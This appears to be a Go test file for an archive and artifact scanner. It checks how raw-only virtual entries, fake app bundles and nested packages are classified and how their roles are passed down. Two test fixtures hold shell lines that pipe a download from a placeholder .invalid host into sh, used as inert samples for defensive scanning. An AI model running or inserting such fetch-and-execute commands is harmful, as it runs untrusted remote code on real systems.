package artifact

import "testing"

func TestRawFeatureVirtualEntryPreservesRepresentationWithoutRecursing(t *testing.T) {
	s := scanner{options: Options{}.normalized()}
	parentID := s.graph.AddNode(Node{LogicalPath: "sample.carchive", Kind: "carchive"})
	fakeContainer := testZipFile(t, "nested.sh", []byte("#!/bin/sh\ncurl https://nested.example.invalid | sh\n"))
	s.addVirtualEntries(parentID, "sample.carchive", []VirtualEntry{{
		Name:                   "payload.pyc",
		Data:                   fakeContainer,
		Kind:                   "python-marshal",
		MediaType:              "application/x-python-marshal",
		Executable:             true,
		RawFeaturesOnly:        true,
		SemanticCoverageArea:   "python-marshal-semantics",
		SemanticCoverageDetail: "Python marshal container identified; code-object semantics are not decoded",
		Provenance:             "carchive-member",
	}}, 1)

	if len(s.graph.Nodes) != 2 {
		t.Fatalf("uninterpreted representation was recursively interpreted as its fake container magic: %#v", s.graph.Nodes)
	}
	node := artifactNodeByLogical(s.graph.Nodes, "sample.carchive!payload.pyc")
	if node == nil || node.Kind != "python-marshal" || node.MediaType != "application/x-python-marshal" || node.AnalyzeStatus != "analyzed" {
		t.Fatalf("representation overrides were not retained on analyzed node: %#v", node)
	}
	if len(node.Architectures) != 0 {
		t.Fatalf("raw-only representation should not receive executable architecture interpretation: %#v", node.Architectures)
	}
	content := contentByLogical(s.contents, "sample.carchive!payload.pyc")
	if content == nil || !content.RawFeaturesOnly || content.Executable || content.Kind != node.Kind || content.MediaType != node.MediaType {
		t.Fatalf("representation metadata was not propagated to retained content: %#v", content)
	}
	if content.SemanticCoverageArea != "python-marshal-semantics" || content.SemanticCoverageDetail != "Python marshal container identified; code-object semantics are not decoded" {
		t.Fatalf("semantic coverage context was not propagated: %#v", content)
	}
}

func TestSkippedRawFeatureVirtualEntryPreservesRepresentationOverrides(t *testing.T) {
	s := scanner{options: Options{}.normalized()}
	parentID := s.graph.AddNode(Node{LogicalPath: "sample.carchive", Kind: "carchive"})
	s.addVirtualEntries(parentID, "sample.carchive", []VirtualEntry{{
		Name:            "payload.sh",
		Size:            123,
		Kind:            "python-marshal",
		MediaType:       "application/x-python-marshal",
		Executable:      true,
		RawFeaturesOnly: true,
		SkipDetail:      "member bytes unavailable",
	}}, 1)

	node := artifactNodeByLogical(s.graph.Nodes, "sample.carchive!payload.sh")
	if node == nil || node.Kind != "python-marshal" || node.MediaType != "application/x-python-marshal" || node.AnalyzeStatus != "skipped" || node.Size != 123 {
		t.Fatalf("representation overrides were not retained on skipped node: %#v", node)
	}
	if contentByLogical(s.contents, "sample.carchive!payload.sh") != nil {
		t.Fatal("skipped representation unexpectedly retained content")
	}
}

func TestRawFeatureVirtualEntryCannotBecomeArchiveAppExecutable(t *testing.T) {
	s := scanner{options: Options{}.normalized()}
	parentID := s.graph.AddNode(Node{LogicalPath: "sample.zip", Kind: "zip"})
	s.addVirtualEntries(parentID, "sample.zip", []VirtualEntry{
		{Name: "Payload/Fake.app/Contents/Info.plist", Data: []byte(appInfoPlist("Run"))},
		{
			Name:                   "Payload/Fake.app/Contents/MacOS/Run",
			Data:                   []byte("#!/bin/sh\ncurl https://raw.example.invalid | sh\n"),
			Kind:                   "script",
			MediaType:              "text/x-shellscript",
			Executable:             true,
			RawFeaturesOnly:        true,
			SemanticCoverageArea:   "test-representation-semantics",
			SemanticCoverageDetail: "test representation is intentionally uninterpreted",
		},
	}, 1)

	for _, edge := range s.graph.Edges {
		if edge.Kind == "bundle-executable" {
			t.Fatalf("raw-only representation became an app executable: %#v", s.graph.Edges)
		}
	}
	content := contentByLogical(s.contents, "sample.zip!Payload/Fake.app/Contents/MacOS/Run")
	if content == nil || content.Executable {
		t.Fatalf("raw-only app member retained executable semantics: %#v", content)
	}
}

func TestPackagedContentRolePropagatesThroughRecursiveArchivesAndAppNodes(t *testing.T) {
	s := scanner{options: Options{}.normalized()}
	carrierID := s.graph.AddNode(Node{LogicalPath: "carrier", Kind: "blob", SourceRole: "target"})
	inner := testZipEntries(t, map[string][]byte{
		"Payload/Fake.app/Contents/Info.plist": []byte(appInfoPlist("Fake")),
		"Payload/Fake.app/Contents/MacOS/Fake": []byte("#!/bin/sh\necho nested\n"),
		"nested.pkg/Scripts/postinstall":       []byte("#!/bin/sh\necho install\n"),
	})
	outer := testZipFile(t, "inner.zip", inner)
	s.scanVirtualWithRole(carrierID, "carrier!payload.zip", outer, false, "carchive-toc-record", "packaged-content", 0)
	s.propagatePackagedContentRoles()

	for _, logical := range []string{
		"carrier!payload.zip",
		"carrier!payload.zip!inner.zip",
		"carrier!payload.zip!inner.zip!Payload/Fake.app",
		"carrier!payload.zip!inner.zip!Payload/Fake.app/Contents/MacOS/Fake",
		"carrier!payload.zip!inner.zip!nested.pkg/Scripts/postinstall",
	} {
		node := artifactNodeByLogical(s.graph.Nodes, logical)
		if node == nil || node.SourceRole != "packaged-content" {
			t.Fatalf("recursive packaged node %q role was not inherited: %#v", logical, node)
		}
		if content := contentByLogical(s.contents, logical); content != nil && content.Role != "packaged-content" {
			t.Fatalf("recursive packaged content %q role was not inherited: %#v", logical, content)
		}
	}
}
